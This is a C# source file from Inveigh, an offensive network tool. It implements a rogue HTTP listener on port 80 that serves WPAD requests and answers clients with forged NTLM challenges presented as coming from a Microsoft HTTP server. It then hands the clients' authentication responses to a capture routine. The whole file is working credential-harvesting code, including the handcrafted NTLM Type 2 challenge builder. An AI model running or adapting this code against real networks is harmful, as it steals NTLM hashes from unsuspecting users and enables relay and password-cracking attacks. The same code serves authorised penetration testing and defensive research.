using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class HTTP
    {

        public static void HTTPListener(string challenge, string computerName, string dnsDomain, string netbiosDomain, string wpadAuth, bool enabledFileOutput, bool enabledSpooferRepeat, string spooferIP, bool enabledMachineAccounts)
        {
            //IPEndPoint httpEndPoint = new IPEndPoint(System.Net.IPAddress.Any, 80);
            TcpListener httpListener = new TcpListener(System.Net.IPAddress.Any, 80);
            httpListener.Start();
            TcpClient httpClient = new TcpClient();
            NetworkStream httpStream = null;
            IAsyncResult httpAsync;
            bool httpConnectionHeaderClose = false;
            bool httpClientClose = false;
            string httpRawURL = "";
            string httpRawURLOld = "";

            IntPtr httpClientHandleOld = new IntPtr(0);

            while (true)
            {
                string httpRequest = "";
                string authorizationNTLM = "NTLM";
                byte[] httpResponse;
                bool httpSend = true;
                byte[] httpHeaderContentType = System.Text.Encoding.UTF8.GetBytes("Content-Type: text/html");
                byte[] httpHeaderAuthenticate = null;
                byte[] httpHeaderAuthenticateData = null;
                byte[] httpHeaderStatusCode = null;
                byte[] httpResponsePhrase = null;
                string httpMessage = "";
                string httpHeaderAuthorization = "";
                string httpHeaderHost = "";
                string httpHeaderUserAgent = "";
                byte[] httpRequestData = new byte[4096];
                int httpReset = 0;

                if (!httpClient.Connected)
                {
                    httpClientClose = false;
                    httpAsync = httpListener.BeginAcceptTcpClient(null, null);

                    do
                    {
                        System.Threading.Thread.Sleep(10);
                    }
                    while (!httpAsync.IsCompleted);

                    httpClient = httpListener.EndAcceptTcpClient(httpAsync);
                    httpStream = httpClient.GetStream();
                }

                while (httpStream.DataAvailable)
                {
                    httpStream.Read(httpRequestData, 0, httpRequestData.Length);
                }

                httpRequest = System.BitConverter.ToString(httpRequestData);

                if (!String.IsNullOrEmpty(httpRequest) && (httpRequest.StartsWith("47-45-54-20") || httpRequest.StartsWith("48-45-41-44-20") || httpRequest.StartsWith("4F-50-54-49-4F-4E-53-20") || httpRequest.StartsWith("43-4F-4E-4E-45-43-54") || httpRequest.StartsWith("50-4F-53-54")))
                {
                    httpRawURL = httpRequest.Substring(httpRequest.IndexOf("-20-") + 4, httpRequest.Substring(httpRequest.IndexOf("-20-") + 1).IndexOf("-20-") - 3);
                    httpRawURL = Common.HexStringToString(httpRawURL);
                    string httpSourceIP = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Address.ToString();
                    string httpSourcePort = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Port.ToString();
                    httpConnectionHeaderClose = true;

                    if (httpRequest.Contains("-48-6F-73-74-3A-20-"))
                    {
                        httpHeaderHost = httpRequest.Substring(httpRequest.IndexOf("-48-6F-73-74-3A-20-") + 19);
                        httpHeaderHost = httpHeaderHost.Substring(0, httpHeaderHost.IndexOf("-0D-0A-"));
                        httpHeaderHost = Common.HexStringToString(httpHeaderHost);
                    }

                    if (httpRequest.Contains("-55-73-65-72-2D-41-67-65-6E-74-3A-20-"))
                    {
                        httpHeaderUserAgent = httpRequest.Substring(httpRequest.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37);
                        httpHeaderUserAgent = httpHeaderUserAgent.Substring(0, httpHeaderUserAgent.IndexOf("-0D-0A-"));
                        httpHeaderUserAgent = Common.HexStringToString(httpHeaderUserAgent);
                    }

                    if (httpClientHandleOld != httpClient.Client.Handle)
                    {
                        httpClientHandleOld = httpClient.Client.Handle;

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] {0} HTTP request for {1} received from {2}:{3}", DateTime.Now.ToString("s"), httpRawURL, httpSourceIP, httpSourcePort));
                            Program.outputList.Add(String.Format("[+] {0} HTTP host header {1} received from {2}:{3}", DateTime.Now.ToString("s"), httpHeaderHost, httpSourceIP, httpSourcePort));

                            if (!String.IsNullOrEmpty(httpHeaderUserAgent))
                            {
                                Program.outputList.Add(String.Format("[+] {0} HTTP user agent received from {1}:{2}:{3}{4}", DateTime.Now.ToString("s"), httpSourceIP, httpSourcePort, System.Environment.NewLine, httpHeaderUserAgent));
                            }

                        }

                    }

                    if (httpRequest.Contains("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-"))
                    {
                        httpHeaderAuthorization = httpRequest.Substring(httpRequest.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46);
                        httpHeaderAuthorization = httpHeaderAuthorization.Substring(0, httpHeaderAuthorization.IndexOf("-0D-0A-"));
                        httpHeaderAuthorization = Common.HexStringToString(httpHeaderAuthorization);
                    }

                    if(String.Equals(httpRawURL,"/wpad.dat") && String.Equals(wpadAuth,"Anonymous"))
                    {
                        httpHeaderStatusCode = new byte[] { 0x32, 0x30, 0x30 };
                        httpResponsePhrase = new byte[] { 0x4f, 0x4b };
                        httpClientClose = true;
                    }
                    else
                    {
                        httpHeaderStatusCode = new byte[] { 0x34, 0x30, 0x31 };
                        httpHeaderAuthenticate = new byte[] { 0x57, 0x57, 0x57, 0x2d, 0x41, 0x75, 0x74, 0x68, 0x65, 0x6e, 0x74, 0x69, 0x63, 0x61, 0x74, 0x65, 0x3a, 0x20 };
                        httpResponsePhrase = new byte[] { 0x55, 0x6e, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x65, 0x64 };
                    }

                    if (httpHeaderAuthorization.StartsWith("NTLM"))
                    {
                        httpHeaderAuthorization = httpHeaderAuthorization.Replace("NTLM", "");
                        byte[] httpAuthorization = System.Convert.FromBase64String(httpHeaderAuthorization);
                        httpConnectionHeaderClose = false;

                        if ((System.BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("01-00-00-00"))
                        {
                            authorizationNTLM = GetNTLMChallengeBase64(true, challenge, httpSourceIP, httpSourcePort, 80, computerName, netbiosDomain, dnsDomain);
                        }
                        else if ((System.BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("03-00-00-00"))
                        {
                            string session = httpSourceIP + ":" + httpSourcePort;
                            string challengeNTLM = "";

                            try
                            {
                                challengeNTLM = Program.httpSessionTable[session].ToString();
                            }
                            catch
                            {
                                challengeNTLM = "";
                            }

                            NTLM.GetNTLMResponse(httpAuthorization, httpSourceIP, httpSourcePort, "HTTP", enabledFileOutput, enabledSpooferRepeat, spooferIP, enabledMachineAccounts);
                            httpHeaderStatusCode = new byte[] { 0x32, 0x30, 0x30 };
                            httpResponsePhrase = new byte[] { 0x4f, 0x4b };
                            httpClientClose = true;
                        }

                    }
                    else
                    {
                        httpClientClose = true;
                    }

                    byte[] httpTimestamp = System.Text.Encoding.UTF8.GetBytes(DateTime.Now.ToString("R"));
                    httpHeaderAuthenticateData = System.Text.Encoding.UTF8.GetBytes(authorizationNTLM);

                    using (MemoryStream msHTTP = new MemoryStream())
                    {
                        msHTTP.Write((new byte[9] { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20 }), 0, 9);
                        msHTTP.Write(httpHeaderStatusCode, 0, httpHeaderStatusCode.Length);
                        msHTTP.Write((new byte[1] { 0x20 }), 0, 1);
                        msHTTP.Write(httpResponsePhrase, 0, httpResponsePhrase.Length);
                        msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                        if (httpConnectionHeaderClose)
                        {
                            byte[] httpHeaderConnection = System.Text.Encoding.UTF8.GetBytes("Connection: close");
                            msHTTP.Write(httpHeaderConnection, 0, httpHeaderConnection.Length);
                            msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                        }

                        byte[] httpHeaderServer = System.Text.Encoding.UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0");
                        msHTTP.Write(httpHeaderServer, 0, httpHeaderServer.Length);
                        msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                        msHTTP.Write((new byte[6] { 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20 }), 0, 6);
                        msHTTP.Write(httpTimestamp, 0, httpTimestamp.Length);
                        msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                        string httpContentLength = "Content-Length: " + httpMessage.Length;
                        byte[] httpHeaderContentLength = System.Text.Encoding.UTF8.GetBytes(httpContentLength);
                        msHTTP.Write(httpHeaderContentLength, 0, httpHeaderContentLength.Length);
                        msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                        if (httpHeaderAuthenticate.Length > 0 && httpHeaderAuthenticateData.Length > 0)
                        {
                            msHTTP.Write(httpHeaderAuthenticate, 0, httpHeaderAuthenticate.Length);
                            msHTTP.Write(httpHeaderAuthenticateData, 0, httpHeaderAuthenticateData.Length);
                            msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                        }

                        msHTTP.Write(httpHeaderContentType, 0, httpHeaderContentType.Length);
                        msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                        msHTTP.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                        httpResponse = msHTTP.ToArray();
                    }

                    if (httpSend && httpStream.CanRead)
                    {
                        httpStream.Write(httpResponse, 0, httpResponse.Length);
                        httpStream.Flush();
                    }

                    httpRawURLOld = httpRawURL;

                    if(httpClientClose)
                    {
                        httpClient.Close();
                    }

                }
                else
                {

                    if(!IntPtr.Equals(httpClientHandleOld,httpClient.Client.Handle))
                    {
                        httpReset++;
                    }
                    else
                    {
                        httpReset = 0;
                    }

                    if(httpConnectionHeaderClose || httpReset > 20)
                    {
                        httpClient.Close();
                        httpReset = 0;
                    }
                    else
                    {
                        System.Threading.Thread.Sleep(10);
                    }

                }

                System.Threading.Thread.Sleep(100);
            }

        }

        public static string GetNTLMChallengeBase64(bool ntlmess, string challenge, string ipAddress, string srcPort, int dstPort, string computerName, string netbiosDomain, string dnsDomain)
        {
            byte[] httpTimestamp = System.BitConverter.GetBytes(DateTime.Now.ToFileTime());
            byte[] challengeArray = new byte[8];
            string session = ipAddress + ":" + srcPort;       
            string httpChallenge = "";

            if (String.IsNullOrEmpty(challenge))
            {
                string challengeCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                char[] challengeCharactersArray = new char[8];
                Random random = new Random();

                for (int i = 0; i < challengeCharactersArray.Length; i++)
                {
                    challengeCharactersArray[i] = challengeCharacters[random.Next(challengeCharacters.Length)];
                }

                string finalString = new String(challengeCharactersArray);
                challengeArray = Encoding.UTF8.GetBytes(finalString);
                httpChallenge = (System.BitConverter.ToString(challengeArray)).Replace("-", "");
            }
            else
            {
                httpChallenge = challenge;
                challenge = challenge.Insert(2, "-").Insert(5,"-").Insert(8,"-").Insert(11,"-").Insert(14,"-").Insert(17,"-").Insert(20,"-");
                int i = 0;

                foreach (string character in challenge.Split('-'))
                {
                    challengeArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                    i++;
                }

            }
   
            Program.httpSessionTable[session] = httpChallenge;
            byte[] httpNTLMNegotiationFlags = { 0x05, 0x82, 0x81, 0x0A };

            if (ntlmess)
            {
                httpNTLMNegotiationFlags[2] = 0x89;
            }

            byte[] hostnameBytes = System.Text.Encoding.Unicode.GetBytes(computerName);
            byte[] netbiosDomainBytes = System.Text.Encoding.Unicode.GetBytes(netbiosDomain);
            byte[] dnsDomainBytes = System.Text.Encoding.Unicode.GetBytes(dnsDomain);
            byte[] dnsHostnameBytes = System.Text.Encoding.Unicode.GetBytes(computerName);
            byte[] hostnameLength = System.BitConverter.GetBytes(hostnameBytes.Length).Take(2).ToArray();
            byte[] netbiosDomainLength = System.BitConverter.GetBytes(netbiosDomainBytes.Length).Take(2).ToArray(); ;
            byte[] dnsDomainLength = System.BitConverter.GetBytes(dnsDomainBytes.Length).Take(2).ToArray(); ;
            byte[] dnsHostnameLength = System.BitConverter.GetBytes(dnsHostnameBytes.Length).Take(2).ToArray(); ;
            byte[] targetLength = System.BitConverter.GetBytes(hostnameBytes.Length + netbiosDomainBytes.Length + dnsDomainBytes.Length + dnsDomainBytes.Length + dnsHostnameBytes.Length + 36).Take(2).ToArray(); ;
            byte[] targetOffset = System.BitConverter.GetBytes(netbiosDomainBytes.Length + 56);

            MemoryStream ms = new MemoryStream();
            ms.Write((new byte[12] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00 }), 0, 12);
            ms.Write(netbiosDomainLength, 0, 2);
            ms.Write(netbiosDomainLength, 0, 2);
            ms.Write((new byte[4] { 0x38, 0x00, 0x00, 0x00 }), 0, 4);
            ms.Write(httpNTLMNegotiationFlags, 0, 4);
            ms.Write(challengeArray, 0, challengeArray.Length);
            ms.Write((new byte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 8);
            ms.Write(targetLength, 0, 2);
            ms.Write(targetLength, 0, 2);
            ms.Write(targetOffset, 0, 4);
            ms.Write((new byte[8] { 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f }), 0, 8);
            ms.Write(netbiosDomainBytes, 0, netbiosDomainBytes.Length);
            ms.Write((new byte[2] { 0x02, 0x00 }), 0, 2);
            ms.Write(netbiosDomainLength, 0, 2);
            ms.Write(netbiosDomainBytes, 0, netbiosDomainBytes.Length);
            ms.Write((new byte[2] { 0x01, 0x00 }), 0, 2);
            ms.Write(hostnameLength, 0, 2);
            ms.Write(hostnameBytes, 0, hostnameBytes.Length);
            ms.Write((new byte[2] { 0x04, 0x00 }), 0, 2);
            ms.Write(dnsDomainLength, 0, 2);
            ms.Write(dnsDomainBytes, 0, dnsDomainBytes.Length);
            ms.Write((new byte[2] { 0x03, 0x00 }), 0, 2);
            ms.Write(dnsHostnameLength, 0, 2);
            ms.Write(dnsHostnameBytes, 0, dnsHostnameBytes.Length);
            ms.Write((new byte[2] { 0x05, 0x00 }), 0, 2);
            ms.Write(dnsDomainLength, 0, 2);
            ms.Write(dnsDomainBytes, 0, dnsDomainBytes.Length);
            ms.Write((new byte[4] { 0x07, 0x00, 0x08, 0x00 }), 0, 4);
            ms.Write(httpTimestamp, 0, httpTimestamp.Length);
            ms.Write((new byte[6] { 0x00, 0x00, 0x00, 0x00, 0x0a, 0x0a }), 0, 6);
            byte[] httpNTLMBytes = ms.ToArray();
            string ntlmChallengeBase64 = System.Convert.ToBase64String(httpNTLMBytes);
            string ntlm = "NTLM " + ntlmChallengeBase64;

            return ntlm;
        }

    }
}
